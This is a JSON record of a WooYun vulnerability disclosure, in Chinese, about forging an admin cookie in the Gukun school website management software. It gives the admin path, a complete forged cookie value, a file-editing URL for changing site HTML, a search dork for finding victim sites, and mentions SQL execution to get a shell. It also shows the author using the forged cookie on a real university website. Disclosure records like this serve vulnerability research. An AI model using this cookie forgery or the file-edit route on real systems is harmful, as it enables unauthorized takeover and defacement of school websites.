{"id": 31708, "wybug_id": "wooyun-2015-0113341", "wybug_title": "谷昆学校网站管理软件后台cookie伪造", "wybug_corp": "南京深图计算机技术有限公司", "wybug_author": "指尖的温度", "wybug_date": "2015-05-11 11:31", "wybug_open_date": "2015-06-25 11:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 谷昆学校网站管理软件后台cookie伪造官方网站：http://www.gukun.com/官方演示站点：http://demo.gukun.com/ 详细说明：  后台可以伪造cookie，修改cookie下就直接进后台默认后台/admin_/cookie：ASP.NET_SessionId=ry4p5fbaras31tv5qigewh55; Caicai_Login网址80/=IsAdmin%3d0%7cUserID%3d1%7cName%3d%e6%9d%8e%e5%8d%8e%e8%be%89%7cGroupName%3d%e7%ae%a1%e7%90%86%e5%91%98%7cUserName%3dadmin%7cGroup%3d%2cC_Word%2cC_News%2cC_Common_download%2cC_Common_notice%2cC_Common_teacher%2cC_GuestBook%2cC_Faq%2cC_Common_link%2cC_Common_banner%2cC_Common_scroll%2cC_User%2cC_UserGroup%2cC_DataBase%2cC_FileBrowse%2cC_Config%2cC_Templates%2cC_Log%2c; Caicai_Email网址80/=把cookie里的网址换为目标网站的域名，修改下cookie，就可以直接进后台了拿shell的话：\n\n执行sql语句，针对iis6.0还可以修改网站的html文件，网站的所有html文件都可以修改如：改程序网站目录自带了error.html文件，修改下访问链接：http://demo.gukun.com/admin_/fileupdate.aspx?action=update&name=error.html是编辑文件内容的，修改的话把链接后面的error.html改为html文件的路径即可，\n\nhttp://demo.gukun.com/error.html百度一下：powered by 谷昆学校网站管理软件不少学校用这套程序：\n\n   漏洞证明：  官网的演示站点：访问后台：\n\n修改下cookie，ASP.NET_SessionId=ry4p5fbaras31tv5qigewh55; Caicai_Logindemo.gukun.com80/=IsAdmin%3d0%7cUserID%3d1%7cName%3d%e6%9d%8e%e5%8d%8e%e8%be%89%7cGroupName%3d%e7%ae%a1%e7%90%86%e5%91%98%7cUserName%3dadmin%7cGroup%3d%2cC_Word%2cC_News%2cC_Common_download%2cC_Common_notice%2cC_Common_teacher%2cC_GuestBook%2cC_Faq%2cC_Common_link%2cC_Common_banner%2cC_Common_scroll%2cC_User%2cC_UserGroup%2cC_DataBase%2cC_FileBrowse%2cC_Config%2cC_Templates%2cC_Log%2c; Caicai_Emaildemo.gukun.com80/=\n\n百度搜索到的站点，挑一个测试：重庆理工大学 xfjs.cqut.edu.cn访问后台：http://xfjs.cqut.edu.cn/admin_/修改下cookie：ASP.NET_SessionId=ry4p5fbaras31tv5qigewh55; Caicai_Loginxfjs.cqut.edu.cn80/=IsAdmin%3d0%7cUserID%3d1%7cName%3d%e6%9d%8e%e5%8d%8e%e8%be%89%7cGroupName%3d%e7%ae%a1%e7%90%86%e5%91%98%7cUserName%3dadmin%7cGroup%3d%2cC_Word%2cC_News%2cC_Common_download%2cC_Common_notice%2cC_Common_teacher%2cC_GuestBook%2cC_Faq%2cC_Common_link%2cC_Common_banner%2cC_Common_scroll%2cC_User%2cC_UserGroup%2cC_DataBase%2cC_FileBrowse%2cC_Config%2cC_Templates%2cC_Log%2c; Caicai_Emailxfjs.cqut.edu.cn80/=\n\n直接进来了修改下error.html，访问：http://xfjs.cqut.edu.cn/admin_/fileupdate.aspx?action=update&name=error.html\n\n   修复方案：  你们更专业   版权声明：转载请注明来源 指尖的温度@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}